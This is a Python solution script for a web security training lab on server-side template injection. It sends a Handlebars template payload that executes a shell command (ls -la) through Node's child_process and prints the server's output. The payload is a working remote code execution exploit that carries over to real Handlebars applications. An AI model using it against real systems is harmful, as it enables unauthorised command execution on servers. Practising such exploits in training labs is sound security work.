# Lab: Server-side template injection in an unknown language with a documented exploit
# difficulty: practitioner

import requests
import re
from urllib.parse import quote

sub = '0acf005e03961af089995e6e00d60060'
url = f'https://{sub}.web-security-academy.net'

def main():
    # {{7*7}} => error, reveals NodeJS, not NUNJUCKS 
    # #{7*7} => #{7*7}, not PugJs
    
    # Handlebars NodeJS => https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars
    payload = '''{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
        {{this.pop}}
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('ls -la');"}}
            {{this.pop}}
            {{#each conslist}}
            {{#with (string.sub.apply 0 codelist)}}
                {{this}}
            {{/with}}
            {{/each}}
        {{/with}}
        {{/with}}
    {{/with}}
    {{/with}}'''
    # print(quote(payload, safe=''))
     
    params = {
        'message': payload
    }

    endpoint = '/'
    r = requests.get(url + endpoint, params=params)
    
    pattern = re.compile(r'</section>\s*<div>(.*?)</div>', re.DOTALL)
    match = pattern.findall(r.text)
    print(match[0])

if __name__ == '__main__':
    main()